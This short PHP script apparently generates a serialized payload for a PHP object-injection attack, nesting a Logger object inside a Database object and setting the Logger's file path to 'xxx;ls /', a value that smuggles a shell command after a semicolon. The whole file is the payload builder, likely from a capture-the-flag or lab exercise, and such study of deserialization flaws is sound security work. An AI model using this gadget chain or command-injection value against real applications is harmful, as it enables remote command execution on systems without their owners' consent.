<?php


class Database {
    public $conn;
    public function __construct($conn) {
        $this->conn = $conn;
    }
}
class Logger {
    public $filepath;
    public function __construct() {
        $this->filepath = "xxx;ls /";    
    }

}



$conn = new Logger();
$db = new Database($conn);

echo serialize($db);

?>